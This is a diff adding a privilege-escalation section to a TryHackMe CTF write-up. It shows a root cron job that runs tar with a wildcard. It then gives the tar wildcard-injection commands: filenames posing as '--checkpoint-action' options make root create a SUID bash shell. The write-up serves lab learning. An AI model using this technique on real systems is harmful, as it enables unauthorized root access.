@@ -10,7 +10,7 @@
 you to hack your way into and prove you have what it takes to become a member of Anonymous.  Can you do it?  Do you have
 what it takes?
 
-
+![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/Anonymous%20Playground/Images/Screenshot%20From%202026-10-01%2011-52-49.png)
 
 ---
 
@@ -275,3 +275,51 @@ python3 -c 'import pty;pty.spawn("/bin/bash")'
 spooky@ip-10-130-166-140:~$ 
 ```
 
+---
+
+## Privilege Escalation
+
+> After some local enumeration, I found a crontjob:
+
+```zsh
+spooky@ip-10-130-166-140:/home/spooky$ cat /etc/crontab
+cat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user  command
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+*/1 *   * * *   root    cd /home/spooky && tar -zcf /var/backups/spooky.tgz *
+#
+```
+
+> This is a textbook vulnerability where we can set checkpoints to execute commands on behalf of root.
+
+```zsh
+cat > shell.sh <<'EOF'
+#!/bin/sh
+cp /bin/bash /tmp/rootbash
+chmod 4755 /tmp/rootbash
+EOF
+
+chmod +x shell.sh
+
+touch -- '--checkpoint=1'
+touch -- '--checkpoint-action=exec=sh shell.sh'
+./tmp/rootbash -p
+```
+
+![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/Anonymous%20Playground/Images/Screenshot%20From%202026-10-01%2011-50-37.png)
+
+![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/Anonymous%20Playground/Images/Screenshot%20From%202026-10-01%2011-51-44.png)
+
+> And we complete this CTF.
